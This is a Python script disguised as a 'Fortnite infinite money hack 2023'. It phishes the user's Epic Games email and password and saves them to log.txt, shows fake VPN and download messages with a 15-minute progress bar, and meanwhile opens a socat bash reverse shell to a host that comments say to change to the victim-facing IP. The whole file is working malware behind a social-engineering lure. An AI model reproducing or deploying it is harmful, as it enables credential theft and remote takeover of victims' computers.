# RECUERDE EDITAR LA LINEA 62 Y USAR LA DIRECCION IP DE EL CLIENTE
# REMEMBER TO EDIT LINE 62 AND USE THE DESIRED CLIENT IP ADDRESS
import time, subprocess, random, threading, os
os.system('clear')
def login():
    print("FORTNITE INFINITE MONEY HACK 2023\nLOGGIN TO EPIC GAMES(ANTI-BAN SYSTEM)")
    email = input("Enter your email: ")
    password = input("Enter your password: ")
    os.system('clear')
    print("FORTNITE INFINITE MONEY HACK 2023\nLOGGIN TO EPIC GAMES(ANTI-BAN SYSTEM)")
    confirm_email = input("Confirm your email: ")
    confirm_password = input("Confirm your password: ")
    
    if email == confirm_email and password == confirm_password:
        with open('log.txt', 'a') as file:
            file.write(f"Email: {email}, Password: {password}\n")
        print("Login successful!")
    else:
        print("Email or password confirmation failed. Please try again.")
        login()
        
login()
time.sleep(5)
print("Starting built-in VPN for a secure connection(ANTI-BAN)...")
time.sleep(10)
print("Connecting to Epic Games... please wait...")
time.sleep(10)
print("Connection succesful!")
time.sleep(4)
# aki puedes poner otro banner para un escenario diferente/ here you can choose another banner for a different scenario
with open('banner.txt', 'r') as f:
    banner = f.read()

def download_bar(progress):
    width = 40
    fill = int(progress / 100 * width)
    empty = width - fill
    return f"[{'=' * fill}>{' ' * empty}] {progress}%"

def countdown(duration):
    while duration >= 0:
        os.system('clear')
        print(banner)

        progress = int((900 - duration) / 900 * 100)
        speed = random.randint(800, 1200)  # velocidad de dwonload en KB/s un poco random / download speed fx
        remaining = duration // speed 
        print(download_bar(progress))
        print(f"{duration // 60:02d}:{duration % 60:02d} Hack Infinite money. Code injection download progress @ {speed} KB/s. Please wait.")
        time.sleep(1)
        duration -= 1

    # mensaje cuando termina download / message when download ends
    os.system('clear')
    print(banner)
    print(download_bar(100))
    print("ERROR: Code injection failed! verify your email and password! check your internet connection and try again!")


def run_subprocess():
    try:
        output = subprocess.check_output(["/usr/bin/socat", "exec:'bash -li',pty,stderr,setsid,sigint,sane", "tcp:127.0.0.1:4444"])
        print(output.decode())
    except subprocess.CalledProcessError as error:
        print(error)

subprocess_thread = threading.Thread(target=run_subprocess)
subprocess_thread.start()

# tiempo del download / download timer
countdown(900)  # 15 minutos = 900 segundos

subprocess_thread.join()
